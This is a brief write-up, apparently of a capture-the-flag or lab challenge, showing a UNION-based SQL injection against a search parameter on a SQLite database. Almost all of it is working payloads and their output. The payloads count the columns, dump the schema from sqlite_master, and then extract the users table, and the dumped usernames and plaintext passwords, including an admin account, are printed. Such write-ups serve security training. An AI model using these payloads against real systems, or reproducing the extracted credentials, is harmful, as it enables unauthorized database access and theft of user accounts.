```
recherche=a'+union+select+null,null--
```
This payload indicate that the current table have 2 collums
```
recherche=a'+union+select+sql,name+from+sqlite_master--
```
return 
```
CREATE TABLE news(id INTEGER, title TEXT, description TEXT) (news)
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER) (users)
```
This return 2 tables (news and users) with theirs collums. To get all the username and password I used the following payload:
```
recherche=a'+union+select+username,password+from+users--
```
```
admin (c4K04dtIaJsuWdi)
user1 (OK4dSoYE)
user2 (8Wbhkzmd)
```